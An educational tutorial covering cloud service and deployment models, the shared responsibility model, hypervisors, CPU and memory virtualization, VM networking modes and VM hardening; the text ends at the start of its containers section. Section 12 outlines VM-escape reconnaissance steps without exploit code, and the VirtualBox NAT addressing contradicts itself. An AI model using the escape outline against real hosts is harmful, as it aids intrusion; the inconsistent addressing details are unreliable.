# Cloud, Virtualization & Cloud Networking
### Deep Dive for Cybersecurity, DevOps & Cloud Engineers

> **Series Context:** This document is Part 3 of the networking series. It builds on `OSI_Model_Deep_Dive.md` (OSI layers, ARP, TCP/UDP, attacks) and `Networking_Deep_Dive_TCPIP_and_Devices.md` (TCP/IP internals, routing, firewalls, load balancers). Foundational concepts from those files are referenced, not repeated.

> **Lab Disclaimer:** All offensive/security techniques are for controlled, authorized environments only.

---

## Table of Contents

### PART 1 — Why Cloud? The Shift from On-Prem
1. [The On-Prem to Cloud Migration Story](#1-the-on-prem-to-cloud-migration-story)
2. [Cloud Service Models: IaaS, PaaS, SaaS](#2-cloud-service-models-iaas-paas-saas)
3. [Cloud Deployment Models](#3-cloud-deployment-models)
4. [Shared Responsibility Model — Security's Most Misunderstood Concept](#4-shared-responsibility-model)

### PART 2 — Foundations: Virtualization & Hypervisors
5. [What Virtualization Actually Does (Under the Hood)](#5-what-virtualization-actually-does)
6. [Hypervisor Types — Type 1 vs Type 2](#6-hypervisor-types)
7. [CPU Virtualization — Rings, VT-x, AMD-V](#7-cpu-virtualization)
8. [Memory Virtualization — EPT, Shadow Page Tables](#8-memory-virtualization)
9. [Storage Virtualization in VMs](#9-storage-virtualization-in-vms)
10. [VM Networking Modes — Deep Dive](#10-vm-networking-modes)
11. [How Ports Work in VMs](#11-how-ports-work-in-vms)
12. [VM Security — Escape, Breakout, and Hardening](#12-vm-security)

### PART 3 — Containerization: Modern Virtualization
13. [Containers vs VMs — The Real Difference](#13-containers-vs-vms)
14. [Linux Primitives: Namespaces & cgroups](#14-linux-primitives-namespaces-and-cgroups)
15. [Docker Networking — All Modes Deep Dive](#15-docker-networking-all-modes)
16. [How Ports Work in Containers](#16-how-ports-work-in-containers)
17. [Container Networking Internals (veth, bridge, iptables)](#17-container-networking-internals)
18. [Kubernetes Networking Deep Dive](#18-kubernetes-networking-deep-dive)
19. [Service Mesh — Istio & Envoy](#19-service-mesh--istio--envoy)
20. [Container Security](#20-container-security

### PART 4 — Cloud Networking (AWS Deep Dive + Concepts)
21. [VPC Architecture — Beyond the Definition](#21-vpc-architecture--beyond-the-definition)
22. [Subnets — Public, Private, Isolated](#22-subnets--public-private-isolated)
23. [Route Tables — Traffic Engineering in Cloud](#23-route-tables--traffic-engineering-in-cloud)
24. [Internet Gateway, NAT Gateway, Egress-Only IGW](#24-internet-gateway-nat-gateway-egress-only-igw)
25. [Security Groups — Stateful Firewall Mechanics](#25-security-groups--stateful-firewall-mechanics)
26. [NACLs — Stateless Layer, Interaction with SGs](#26-nacls--stateless-layer-interaction-with-sgs)
27. [DNS in Cloud — Route 53, Private Hosted Zones, Split-Horizon](#27-dns-in-cloud--route-53-private-hosted-zones-split-horizon)
28. [IP Addressing in Cloud — Public, Private, Elastic, IPv6](#28-ip-addressing-in-cloud)
29. [L4 and L7 Load Balancing in Cloud](#29-l4-and-l7-load-balancing-in-cloud)
30. [Reverse Proxies in Cloud Architecture](#30-reverse-proxies-in-cloud-architecture)
31. [TLS/SSL & HTTPS — End-to-End in Cloud](#31-tlsssl--https--end-to-end-in-cloud)
32. [IAM & Network Security — Where Auth Meets Network](#32-iam--network-security--where-auth-meets-network)
33. [Network Isolation Patterns](#33-network-isolation-patterns)
34. [Zero Trust Networking](#34-zero-trust-networking)
35. [VPC Peering, Transit Gateway, PrivateLink](#35-vpc-peering-transit-gateway-privatelink)
36. [Cloud Attack Surface & Pentest Scenarios](#36-cloud-attack-surface--pentest-scenarios)

---

# PART 1 — WHY CLOUD? THE SHIFT FROM ON-PREM

---

## 1. The On-Prem to Cloud Migration Story

### Layman's Terms
Imagine you used to own a car (your own servers). You paid for it upfront, maintained it yourself, paid for repairs, and it sat idle 80% of the time. Then Uber arrived (the cloud). Now you pay per ride, someone else maintains the car, you get a better car when needed, and you only pay when you actually use it.

### The Real-World Problem Cloud Solved

```
Traditional On-Premises Infrastructure Problems:

CAPACITY PLANNING NIGHTMARE:
  You predict next year's traffic. You're wrong.
  Over-provision: servers sit idle (wasted money)
  Under-provision: Black Friday → site crashes (wasted revenue)
  Lead time to add servers: 6–12 weeks (order, ship, rack, configure)
  
  Amazon 2006: They solved their own problem, then sold the solution.
  AWS was born from Amazon's internal infra that had to handle
  holiday traffic peaks 10x normal → built elastic infrastructure.

CAPEX vs OPEX:
  On-prem: $1M upfront (CAPEX) → appears on balance sheet
           + maintenance, power, cooling, datacenter space
  Cloud:   $0 upfront, pay-as-you-go (OPEX)
           → treated as operating expense (tax advantages)
           → no stranded assets when pivoting

OPERATIONAL OVERHEAD:
  On-prem team: network engineers, sysadmins, storage admins,
                datacenter techs, security team for physical access
  Cloud: "undifferentiated heavy lifting" eliminated
         Focus on your product, not your infrastructure

GLOBAL REACH:
  On-prem: New York HQ, want to serve users in Tokyo?
           → rent datacenter in Japan ($$$), hire local team
  Cloud:   One click → deploy to ap-northeast-1 (Tokyo)
```

### Real-World Migration Events

| Company | Migration Story | Outcome |
|---------|----------------|---------|
| Netflix | 2008–2016: Migrated from own datacenters to AWS | Serves 260M+ users across 190 countries; 7 years to full migration |
| Dropbox | 2016: Moved BACK from AWS to own hardware (reverse migration) | Saved $75M over 2 years — unique case, most companies don't do this |
| Capital One | 2020: First major US bank to go all-in on cloud | Closed all 8 on-prem datacenters |
| GE | Hybrid cloud adoption for industrial IoT data | Cost savings but also data sovereignty concerns |

### The 5 Rs of Cloud Migration

```
REHOST (Lift and Shift):
  Take VM, move to cloud as-is (EC2/GCP VM)
  Fastest migration, lowest risk
  Doesn't leverage cloud-native features
  Security: same vulnerabilities, now externally accessible

REPLATFORM (Lift, Tinker, and Shift):
  Minimal modifications to leverage cloud services
  Example: MySQL on-prem → Amazon RDS (managed MySQL)
  No code changes, but use managed services

REFACTOR / RE-ARCHITECT:
  Redesign to be cloud-native
  Monolith → microservices → containers → Kubernetes
  Highest cost, highest long-term benefit
  Example: Netflix's full microservices rewrite

RETIRE:
  Identify unused systems, decommission them
  25–30% of on-prem systems are often abandoned

RETAIN (Keep On-Prem):
  Regulatory (data sovereignty), performance (ultra-low latency),
  or cost reasons keep some workloads on-prem
  Result: Hybrid cloud

Security implication: Each migration type has different
attack surface. Lift-and-shift exposes old vulnerabilities
to the internet. Refactoring creates new attack surfaces.
```

---

## 2. Cloud Service Models: IaaS, PaaS, SaaS

### The Pizza Analogy (Then The Real Engineering Version)

```
                 On-Prem    IaaS      PaaS      SaaS
                 ─────────────────────────────────────
Application        YOU       YOU       YOU     VENDOR
Data               YOU       YOU       YOU     VENDOR
Runtime            YOU       YOU     VENDOR    VENDOR
Middleware         YOU       YOU     VENDOR    VENDOR
OS                 YOU       YOU     VENDOR    VENDOR
Virtualization     YOU      VENDOR   VENDOR    VENDOR
Servers            YOU      VENDOR   VENDOR    VENDOR
Storage            YOU      VENDOR   VENDOR    VENDOR
Networking         YOU      VENDOR   VENDOR    VENDOR

YOU = you manage it = you're responsible for security of it
VENDOR = provider manages it = vendor responsible for security
```

### Engineering Perspective on Each Model

```
IAAS (Infrastructure as a Service):
  AWS EC2, GCP Compute Engine, Azure VMs
  
  You get: Virtual machines, block storage, virtual networking
  You manage: OS patches, security configs, installed software
  
  Network perspective:
    - You configure VPC, subnets, security groups
    - Your VM has a network interface (ENI in AWS)
    - You control inbound/outbound rules
    
  Security responsibility:
    - OS hardening (your job)
    - Application security (your job)
    - Network ACLs (your job)
    - Physical server security (AWS's job)
    - Hypervisor security (AWS's job)

PAAS (Platform as a Service):
  AWS Elastic Beanstalk, GCP App Engine, Heroku, AWS Lambda
  
  You get: Runtime environment, auto-scaling, managed OS
  You manage: Application code, data
  
  Network perspective:
    - AWS Lambda: No VPC by default (runs in AWS-managed VPC)
    - VPC Lambda: Function runs in YOUR VPC, has ENI
    - No SSH access to underlying compute
    - Networking abstracted — you configure endpoints/triggers
    
  Security responsibility:
    - Application code vulnerabilities (your job)
    - Function permissions/IAM (your job)
    - Data encryption (your job)
    - OS security (AWS's job)

SAAS (Software as a Service):
  Salesforce, Gmail, GitHub, Slack, Office 365
  
  You get: Working application over HTTPS
  You manage: User access, data classification, configurations
  
  Network perspective:
    - All traffic over HTTPS (TLS)
    - API access via HTTPS endpoints
    - SSO/SAML integration for auth
    - No network-level configuration
    
  Security responsibility:
    - Who has access (your job)
    - What data you put in it (your job)
    - Platform security (vendor's job)
    - But: data breaches on SaaS platforms expose YOUR data
```

---

## 3. Cloud Deployment Models

```
PUBLIC CLOUD:
  AWS, GCP, Azure, Oracle Cloud
  Multi-tenant: your workloads run alongside other customers' workloads
  (isolated by hypervisor + network virtualization)
  Security concern: noisy neighbor, hypervisor vulnerability
  
PRIVATE CLOUD:
  Cloud infrastructure dedicated to ONE organization
  Examples: OpenStack on-prem, VMware vSphere, AWS GovCloud (dedicated)
  More control, more cost, same operational flexibility
  
HYBRID CLOUD:
  Mix of on-prem + public cloud
  Connected via: VPN, Direct Connect (AWS), ExpressRoute (Azure)
  Challenge: network latency between on-prem and cloud
  Security challenge: expanded attack surface, consistent policy enforcement
  
MULTI-CLOUD:
  Using multiple cloud providers simultaneously
  Reasons: avoid vendor lock-in, best-of-breed services, disaster recovery
  Netflix: primarily AWS + some GCP
  Security challenge: inconsistent IAM models, different security tooling
  
COMMUNITY CLOUD:
  Shared between organizations with similar requirements
  Government agencies, healthcare orgs sharing compliant infrastructure
  Example: AWS GovCloud (US), FedRAMP-compliant environments
```

---

## 4. Shared Responsibility Model

### The Most Important Security Concept in Cloud

```
AWS's statement: "Security OF the cloud vs security IN the cloud"

AWS IS responsible for:
  ✓ Physical datacenter security (guards, biometrics, cameras)
  ✓ Hardware security (servers, networking gear, storage arrays)
  ✓ Hypervisor security (isolation between VMs)
  ✓ Global network infrastructure
  ✓ Availability Zones and Region infrastructure
  ✓ Managed service software (RDS MySQL binary, Lambda runtime)

YOU ARE responsible for:
  ✓ Everything you put on the VM (OS, application, config)
  ✓ Security group configurations
  ✓ IAM policies and permissions
  ✓ Encryption of your data at rest and in transit
  ✓ VPC and network configuration
  ✓ Patching your OS and applications
  ✓ Firewall rules (security groups, NACLs)
  ✓ Access keys and credentials management
  ✓ Compliance (HIPAA, PCI, GDPR requirements specific to your app)

GRAY AREAS that cause breaches:
  
1. RDS (managed database):
   AWS manages: OS patching, replication, backups
   YOU manage: Who can access the DB (security groups + DB users)
   BREACH: Public RDS endpoint + 0.0.0.0/0 security group = game over
   
2. S3 Buckets:
   AWS manages: Storage infrastructure, durability
   YOU manage: Bucket policies, ACLs, public access block
   BREACH: 2019 Capital One breach — misconfigured S3 + SSRF on EC2
   
3. Lambda Functions:
   AWS manages: Runtime, execution environment
   YOU manage: Function code, IAM execution role, environment variables
   BREACH: Lambda with over-permissive IAM + code injection vulnerability
```

---

# PART 2 — FOUNDATIONS: VIRTUALIZATION & HYPERVISORS

---

## 5. What Virtualization Actually Does

### Layman's Terms
Imagine a house with 4 big bedrooms. Instead of renting the whole house to one family (one server, one OS), you build internal walls (virtualization) to create 8 smaller apartments. Each apartment has its own door, utilities appear separate, but they all share the same building structure. The building manager (hypervisor) decides who gets what.

### Formal Definition
Virtualization is the abstraction of physical hardware resources (CPU, memory, storage, network) into logical units, enabling multiple isolated operating system instances (virtual machines) to run concurrently on a single physical host. The hypervisor mediates all access to physical hardware.

### What Actually Happens When You Start a VM

```
Physical Host:
  CPU: Intel Xeon with 32 cores, 64 threads
  RAM: 256 GB
  NIC: 40 Gbps dual-port
  Storage: 10 TB NVMe SSD

You create VM: "2 vCPUs, 4 GB RAM, 50 GB disk, 1 NIC"

The hypervisor creates:
  
1. vCPU (virtual CPU):
   NOT a physical core dedicated to you.
   A vCPU is a scheduling slot.
   Hypervisor time-slices physical CPU cores among all VMs.
   VM thinks it has 2 CPUs. Actually gets CPU time as allocated.
   Overcommit: 32 physical cores → 128 vCPUs across 64 VMs (4:1 ratio common)
   
2. vRAM (virtual memory):
   VM gets a contiguous virtual memory space.
   Backed by physical RAM (or swap if overcommitted).
   VM's memory addresses ≠ physical memory addresses.
   Two layers of translation: VM virtual → VM physical → Host physical
   
3. Virtual Disk:
   A FILE on the host's storage (VMDK, VHD, QCOW2, RAW)
   VM thinks it has a physical NVMe drive.
   Actually: read/write → file operations on host filesystem
   Thin provisioning: 50 GB allocated, only 10 GB used = 10 GB on disk
   Thick provisioning: 50 GB allocated = 50 GB reserved on disk immediately
   
4. Virtual NIC (vNIC):
   A software NIC presented to the VM.
   VM sees it as a physical Ethernet adapter.
   Actually: connected to a virtual switch (vSwitch) in hypervisor
   Traffic flows through host kernel networking stack
```

---

## 6. Hypervisor Types

### Type 1 — Bare Metal Hypervisor

```
Type 1 Hypervisor runs directly on hardware — no host OS:

HARDWARE
    │
TYPE 1 HYPERVISOR (runs directly on metal)
    │
    ├── VM 1 (Guest OS: Windows Server)
    ├── VM 2 (Guest OS: Ubuntu)
    └── VM 3 (Guest OS: CentOS)

Examples:
  VMware ESXi (vSphere)     ← Enterprise datacenter standard
  Microsoft Hyper-V         ← Windows Server hypervisor
  Xen                       ← AWS used Xen until 2017, now Nitro (KVM-based)
  KVM (Kernel-based VM)     ← Linux kernel as hypervisor, used by AWS Nitro,
                               GCP, OpenStack, QEMU
  
Performance: Direct hardware access → near-native performance
Security: Smaller attack surface (no host OS to compromise)
Use case: Production datacenters, cloud providers

AWS Nitro System (modern cloud example):
  Not traditional hypervisor — offloads to dedicated hardware:
  Nitro Card (NIC): handles all network I/O
  Nitro Card (EBS): handles storage I/O  
  Nitro Security Chip: boots attestation, hardware root of trust
  Nitro Hypervisor (KVM): minimal — only CPU/memory virtualization
  
  Security benefit: network and storage traffic never touches host CPU
  → Host operators cannot inspect tenant data (hardware enforcement)
```

### Type 2 — Hosted Hypervisor

```
Type 2 Hypervisor runs ON TOP of a host OS:

HARDWARE
    │
HOST OS (Windows 10, Ubuntu, macOS)
    │
TYPE 2 HYPERVISOR (application on host OS)
    │
    ├── VM 1 (Guest OS: Kali Linux)
    └── VM 2 (Guest OS: Windows Server)

Examples:
  VMware Workstation / Fusion  ← Professional desktop virtualization
  VirtualBox                   ← Free, cross-platform (your lab!)
  QEMU (without KVM)           ← Software emulation (slow without KVM)
  Parallels                    ← macOS-focused
  
Performance: Extra layer (host OS) = overhead
Security: Larger attack surface (if host OS is compromised, VMs exposed)
Use case: Development, testing, home labs

Interesting: KVM makes Linux itself the Type 1 hypervisor
  Linux with KVM: HARDWARE → LINUX (as hypervisor) → VMs
  QEMU provides device emulation, KVM provides hardware acceleration
  This is the dominant open-source hypervisor stack
```

---

## 7. CPU Virtualization

### The Problem: Privilege Rings

```
x86 CPU has 4 privilege rings:
  Ring 0: Kernel/OS        (most privileged — direct hardware access)
  Ring 1: Device drivers   (rarely used)
  Ring 2: Device drivers   (rarely used)
  Ring 3: User applications (least privileged — no direct hardware)

Problem: Guest OS (inside VM) thinks it's running in Ring 0.
         But it can't actually run in Ring 0 — hypervisor owns Ring 0.
         If guest OS tries privileged instruction → CRASH or security breach.

Solutions:

1. FULL EMULATION (slow, no hardware support needed):
   Hypervisor intercepts every privileged instruction
   Translates to safe equivalent
   Overhead: 10-30% performance penalty
   
2. PARA-VIRTUALIZATION (Xen approach):
   Guest OS is MODIFIED to know it's in a VM
   Uses "hypercalls" instead of privileged instructions
   Better performance but requires modified guest OS kernel
   
3. HARDWARE-ASSISTED VIRTUALIZATION (modern standard):
   Intel VT-x (Virtualization Technology for x86)
   AMD-V (AMD Virtualization)
   
   New CPU mode: VMX root (hypervisor) vs VMX non-root (guest)
   Guest runs in Ring 0 of VMX non-root mode
   Hardware traps sensitive instructions, transfers to hypervisor
   Guest OS UNMODIFIED, near-native performance
   
   Verify hardware virtualization support:
   grep -E 'vmx|svm' /proc/cpuinfo  # vmx=Intel, svm=AMD
   
   Enable in VirtualBox for your VMs:
   Settings → System → Processor → Enable VT-x/AMD-V
```

---

## 8. Memory Virtualization

```
The Memory Address Translation Problem:

Without VM:
  App virtual address → Page Table → Physical RAM address
  One level of translation

With VM:
  App virtual address → Guest Page Table → Guest Physical address
                                              → Extended Page Table → HOST Physical address
  TWO levels of translation!

Solutions:

SHADOW PAGE TABLES (old approach):
  Hypervisor maintains "shadow" page tables that map directly
  guest virtual → host physical (skips guest physical layer)
  Fast but: hypervisor must update shadow tables on every guest
  page table change → expensive, complex

EXTENDED PAGE TABLES (EPT) / NESTED PAGE TABLES (NPT):
  Intel EPT (Nehalem 2008) / AMD NPT
  Hardware supports TWO-LEVEL page walks in hardware
  Guest's page table walks hardware-accelerated
  No shadow tables needed — hardware does the 2-level lookup
  Massive performance improvement over shadow PT

Memory Overcommit (Cloud's dirty secret):
  Cloud providers sell 4x more RAM than physically exists
  Betting not everyone uses 100% simultaneously
  
  Mechanisms:
  BALLOONING: Hypervisor inflates a balloon driver in VM
              VM's guest OS thinks it's out of RAM
              VM swaps to its own disk (hurts VM performance)
              Hypervisor reclaims freed physical RAM
              
  TRANSPARENT PAGE SHARING (TPS/KSM):
    If two VMs have identical memory pages (same OS, same library)
    Hypervisor maps both to SAME physical page
    Copy-on-Write: when one VM modifies it, a private copy is made
    
    Security issue: Rowhammer attack exploited TPS
    Flush+Reload cache side-channel attack works across TPS pages
    → Disabled by default in most production hypervisors now

Security relevance:
  Spectre/Meltdown (2018): Exploited CPU speculative execution
  Could read OTHER VMs' memory through CPU cache side-channels
  Patches required hypervisor changes + OS patches
  Some patches caused 5-30% performance regression on cloud instances
```

---

## 9. Storage Virtualization in VMs

```
VM Disk formats and their security implications:

VMDK (VMware Virtual Machine Disk):
  VMware's format
  Thin: allocate-on-write (file grows as VM writes data)
  Thick eager: all space pre-allocated and zeroed (slower to create, faster I/O)
  Thick lazy: space pre-allocated, NOT zeroed (fast to create, data recovery risk)
  
  SECURITY: Deleted files in a thin VMDK may still exist in
            old blocks — forensic recovery possible
  SECURITY: Thick lazy → data from previous tenant on same storage

QCOW2 (QEMU Copy-On-Write):
  KVM/QEMU format
  Supports snapshots, compression, encryption
  Copy-on-Write: base image + delta file
  
  Snapshots:
  ┌──────────────────────────────────────────┐
  │ Base disk image (base.qcow2)             │ ← Read only after snapshot
  └──────────────────────────────────────────┘
              │ (changes written to overlay)
  ┌──────────────────────────────────────────┐
  │ Snapshot delta (snap1.qcow2)             │ ← Only contains changes
  └──────────────────────────────────────────┘
  
  SECURITY: Snapshot chains can expose sensitive data
            if snapshot not properly deleted
            Revert to snapshot = undo password changes, patches!
            
RAW format:
  1:1 copy of disk — no container overhead
  Fastest I/O
  No snapshot support
  Security: Direct block device mapping

VirtIO (paravirtual driver for storage):
  Guest OS knows it's in a VM (modified kernel driver)
  Direct communication path to hypervisor → faster than emulated SCSI
  Linux default: virtio-blk or virtio-scsi
  Check: lsblk → /dev/vda instead of /dev/sda means VirtIO
```

---

## 10. VM Networking Modes

### The Complete Guide (VirtualBox/KVM/VMware)

```
VM networking is where virtualization meets your existing
networking knowledge from the OSI and TCP/IP files.
The VM's virtual NIC connects to a virtual switch,
which connects to the host's physical NIC.
```

### Mode 1: NAT (Network Address Translation)

```
Architecture:
  VM (10.0.2.15) → Virtual NAT → Host Physical NIC → Internet

What happens:
  Hypervisor creates a private network (10.0.2.0/24)
  VM gets address via built-in DHCP (10.0.2.15 typically)
  VM's traffic is NAT'd through the host's physical IP
  VM can reach internet: YES (outbound)
  Internet can reach VM: NO (by default — NAT blocks inbound)
  Host can reach VM: YES (via loopback if port forwarding set)
  Other VMs can reach this VM: NO (each VM has isolated NAT network)

Port forwarding (to expose VM services):
  VirtualBox: Settings → Network → Port Forwarding
  Rule: Host port 8080 → Guest IP 10.0.2.15 port 80
  
  From host: curl http://localhost:8080 → reaches VM's port 80
  From network: curl http://host_ip:8080 → reaches VM's port 80

Use case: Internet-connected development VMs, isolated testing
Security: VM isolated from LAN, cannot be directly attacked
          But VM can still call out (malware can C2)
          
Internals (VirtualBox):
  Virtual DHCP server: 10.0.2.2 (gateway = host)
  DNS: 10.0.2.3 (forwarded to host's DNS)
  Gateway: 10.0.2.1
```

### Mode 2: NAT Network (VirtualBox-specific)

```
Architecture:
  VM1 (10.0.2.15) ─┐
  VM2 (10.0.2.16) ─┤→ Virtual NAT Network → Host NIC → Internet
  VM3 (10.0.2.17) ─┘

Unlike basic NAT: VMs on the SAME NAT Network can communicate with each other
Use case: Multi-VM labs where VMs need internet AND local communication
This is what we set up in the OSI file for pen-test labs
```

### Mode 3: Bridged Networking

```
Architecture:
  VM (192.168.1.x) → Virtual Bridge → Host Physical NIC → Real Network

What happens:
  VM's virtual NIC is BRIDGED to host's physical NIC
  VM appears as a separate device on your real physical network
  Gets IP from your router's DHCP (same range as your laptops)
  VM has own MAC address (hypervisor-generated)
  
  From network perspective: VM IS INDISTINGUISHABLE from real machine
  
Can reach internet: YES
Can be reached from LAN: YES (same as any other device)
Other VMs can reach it: YES (if on same network segment)

Use case: 
  - VM needs to be a server accessible by real machines on LAN
  - Testing network services with real clients
  - Metasploitable2 target accessible from real Kali

Security risk:
  VM is FULLY EXPOSED to physical network
  Network scanners (nmap) will discover it
  Any vulnerability in VM is accessible from LAN
  Use ONLY for intentionally vulnerable VMs on isolated physical networks
  
How bridging works (Linux):
  brctl addbr virbr0                    # Create bridge
  brctl addif virbr0 eth0              # Add physical NIC to bridge
  ip link set virbr0 up
  # VM's tap device also added to bridge
  # All traffic on bridge → all devices on bridge see it
  ip link show type bridge
  brctl show
```

### Mode 4: Host-Only Networking

```
Architecture:
  VM1 (192.168.56.101) ─┐
  VM2 (192.168.56.102) ─┤→ Virtual Switch (no internet uplink)
  Host (192.168.56.1)  ─┘

ISOLATED NETWORK:
  - VMs can communicate with each other: YES
  - VMs can communicate with host: YES
  - VMs can reach internet: NO
  - External machines can reach VMs: NO

Virtual NIC on host: vboxnet0 (VirtualBox) or virbr0 (KVM)
This NIC has an IP on the host-only network

Use case:
  BEST MODE FOR SECURITY LABS
  Kali (192.168.56.1) + Metasploitable (192.168.56.2)
  Completely isolated from your real network
  Malware/payloads cannot escape to real network

KVM equivalent (libvirt isolated network):
  virsh net-define isolated-net.xml
  
  <network>
    <name>isolated</name>
    <bridge name='virbr1'/>
    <ip address='192.168.100.1' netmask='255.255.255.0'>
      <dhcp>
        <range start='192.168.100.2' end='192.168.100.254'/>
      </dhcp>
    </ip>
  </network>
```

### Mode 5: Internal Network (VirtualBox) / Isolated (KVM)

```
Architecture:
  VM1 ─┐
  VM2 ─┤→ Virtual Switch (COMPLETELY isolated — host cannot see it)
  VM3 ─┘

STRICTLY VM-TO-VM:
  VMs can communicate with each other: YES
  VMs can communicate with host: NO
  VMs can reach internet: NO
  Host cannot even see traffic in this network
  
Difference from Host-Only: Host itself has NO NIC in this network
Use case: Ultra-isolated malware analysis environments
          Host cannot be compromised even if VM is compromised
```

### Mode 6: Custom Virtual Networking (VMware vSwitch / OVS)

```
In enterprise hypervisors (ESXi, KVM+OVS), you build
full virtual network topologies:

VMware vSwitch:
  Physical ports (pNIC): connects to real network
  VM ports (vNIC): connects VMs to vSwitch
  Uplink ports: connects vSwitch to physical NICs

  vSwitch features:
    VLANs (802.1Q): separate VMs into virtual broadcast domains
    Traffic shaping: limit bandwidth per VM
    Security policies: promiscuous mode, MAC change, forged transmit
    
    Security: Disable promiscuous mode unless needed for monitoring
    In promiscuous mode: VM NIC receives ALL traffic on vSwitch
    (like a hub — used for legitimate traffic capture, but risky)

Open vSwitch (OVS) — used in OpenStack, KVM, SDN:
  Software-defined switch with full L2-L4 feature set
  Supports: VLANs, trunking, RSTP, 802.1Q, NetFlow, sFlow
  Integrates with SDN controllers (OpenDaylight, ONOS)
  
  # Create OVS bridge
  ovs-vsctl add-br br0
  
  # Add physical NIC
  ovs-vsctl add-port br0 eth0
  
  # Add VLAN tagging for VM traffic
  ovs-vsctl add-port br0 vnet0 tag=100  # VM in VLAN 100
  
  # View bridge topology
  ovs-vsctl show
```

---

## 11. How Ports Work in VMs

### The Full Picture: From Application to Wire

```
Scenario: Web server (nginx) running in a VM, port 80
          You want to access it from your host machine

Step-by-step packet journey:

1. Nginx in VM binds to port 80:
   VM OS creates socket: TCP 0.0.0.0:80 (listen on all interfaces)
   VM's virtual NIC has IP: 192.168.56.102 (host-only)
   
2. Request from host machine:
   curl http://192.168.56.102:80
   Host creates TCP connection: SYN to 192.168.56.102:80
   
3. Host's routing:
   Destination 192.168.56.102 → route lookup
   Match: 192.168.56.0/24 via vboxnet0 (host-only interface)
   ARP for 192.168.56.102 → VM's virtual NIC MAC responds
   
4. Virtual NIC layer:
   Ethernet frame travels from host's vboxnet0 → virtual switch → VM's vNIC
   VM's OS receives Ethernet frame → TCP/IP stack processes it
   → Arrives at nginx socket on port 80 → nginx handles it

5. Port Forwarding (NAT mode, exposing port to outside):
   VM is in NAT mode (10.0.2.15)
   You add rule: Host port 8080 → Guest 10.0.2.15:80
   
   External request: curl http://host_ip:8080
   Hypervisor NAT engine intercepts: dst=host_ip:8080
   DNAT: dst changed to 10.0.2.15:80
   Forwarded to VM
   Response: SNAT: src changed from 10.0.2.15:80 to host_ip:8080
   
   From VM's perspective: request came from 10.0.2.2 (gateway)
   VM never sees real client IP (NAT hides it)
   
6. Multiple VMs on same port (port conflict solution):
   VM1 (web server, port 80) → Host port forward: 8001 → VM1:80
   VM2 (web server, port 80) → Host port forward: 8002 → VM2:80
   VM3 (SSH, port 22)        → Host port forward: 2201 → VM3:22
   
   From host:
   curl http://localhost:8001  → VM1 web server
   curl http://localhost:8002  → VM2 web server
   ssh -p 2201 localhost       → VM3 SSH
```

### VMs Communicating with Each Other: Port Rules

```
VM1 (192.168.56.101) wants to connect to VM2:8080 (192.168.56.102)

Requirements:
  1. Both VMs on same virtual network (host-only or NAT network)
  2. VM2's OS firewall (iptables) must allow port 8080
  3. Application must listen on 0.0.0.0:8080 (not 127.0.0.1:8080)

Common mistake: App binds to 127.0.0.1 only (loopback)
  → Only accessible from WITHIN the VM
  → curl http://localhost:8080 works inside VM
  → curl http://192.168.56.102:8080 fails from outside
  
Fix in nginx:  listen 0.0.0.0:80;   (or just: listen 80;)
Fix in Python: app.run(host='0.0.0.0', port=8080)
Fix in Node.js: server.listen(8080, '0.0.0.0')

Verify what's listening and where:
  ss -tlnp                           # All listening TCP sockets
  ss -tlnp | grep 8080               # Specific port
  netstat -tlnp 2>/dev/null | grep LISTEN

Check if traffic reaches VM (tcpdump):
  sudo tcpdump -i eth0 'tcp port 8080' -v
```

---

## 12. VM Security

### VM Escape — The Most Critical Hypervisor Vulnerability

```
VM Escape: A vulnerability that allows code running INSIDE a VM
           to break out and execute on the HOST or another VM.

This is catastrophic in multi-tenant cloud environments.
If VM escape exists, tenant A can attack tenant B's VM.

Historical VM escapes:
  VENOM (CVE-2015-3456): Floppy disk controller vulnerability in QEMU
    Virtual floppy disk buffer overflow → host code execution
    Affected: KVM, Xen, VirtualBox, QEMU
    Patched: May 2015
    
  Escape from VirtualBox (multiple CVEs): 
    SVGA device, shared folders, USB emulation exploits
    
  VMware Guest-to-Host (multiple CVEs):
    VMware Tools, SVGA device, drag-and-drop exploits
    
  Cloudburst (VMware 2009):
    Display emulation buffer overflow → host escape
    
Technique demonstration (conceptual, do NOT replicate on others):
  1. Identify hypervisor type: dmesg | grep -i hypervisor
                               systemd-detect-virt
                               dmidecode -s system-product-name
  2. Find hypervisor version: cat /proc/scsi/scsi (QEMU version in product name)
  3. Search CVE database for version
  4. Exploit virtual device (SVGA, USB, audio, network card)
  
Defense:
  Keep hypervisors patched (most critical patch priority)
  Disable unnecessary virtual devices (floppy, USB, audio if not needed)
  Use minimal VM configurations (attack surface reduction)
  AWS Nitro: hardened hypervisor with hardware offload
             → dramatically reduced attack surface
```

### VM Hardening Checklist

```bash
# 1. Minimal OS installation
# Remove unnecessary packages
sudo apt remove --purge bluetooth cups avahi-daemon -y
sudo systemctl disable bluetooth cups avahi-daemon

# 2. Disable unnecessary virtual hardware in VM settings
# VirtualBox CLI:
VBoxManage modifyvm "MyVM" --usb off
VBoxManage modifyvm "MyVM" --audio none
VBoxManage modifyvm "MyVM" --floppy disabled
VBoxManage modifyvm "MyVM" --clipboard disabled  # Clipboard sharing = info leak

# 3. Disable VM tools unnecessary features
# VMware: Edit /etc/vmware-tools/tools.conf
# [guestinfo]
# disable-query-diskinfo = true

# 4. Enable ASLR in VM OS
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space

# 5. Disable core dumps (prevent sensitive data in dump)
echo '* hard core 0' | sudo tee -a /etc/security/limits.conf
echo 'fs.suid_dumpable = 0' | sudo tee -a /etc/sysctl.conf

# 6. VM snapshots as security checkpoints
# Take clean snapshot after hardening
VBoxManage snapshot "MyVM" take "Clean-State" --description "Post-hardening baseline"

# Revert if VM is compromised during testing:
VBoxManage snapshot "MyVM" restore "Clean-State"
```

---

# PART 3 — CONTAINERIZATION: MODERN VIRTUALIZATION

---

## 13. Containers vs VMs — The Real Difference

### Layman's Terms
A VM is a **complete house** with its own foundation, walls, plumbing, electrical — everything. A container is a **furnished room inside a shared house**. The room has its own furniture and locks, but shares the building's foundation, plumbing, and electrical with other rooms. Containers are lighter because they share the host's kernel.

### The Architecture Difference

```
VIRTUAL MACHINES:
┌────────────────────────────────────────────────────────┐
│ VM 1           │ VM 2           │ VM 3                 │
│ App A          │ App B          │ App C                │
│ Bins/Libs      │ Bins/Libs      │ Bins/Libs            │
│ Guest OS (2GB) │ Guest OS (2GB) │ Guest OS (2GB)       │
├────────────────┴────────────────┴──────────────────────┤
│                    Hypervisor                          │
├────────────────────────────────────────────────────────┤
│                    Host OS                             │
├────────────────────────────────────────────────────────┤
│                    Hardware                            │
└────────────────────────────────────────────────────────┘
Total for 3 apps: 3 × 2GB OS overhead = 6GB just for OS

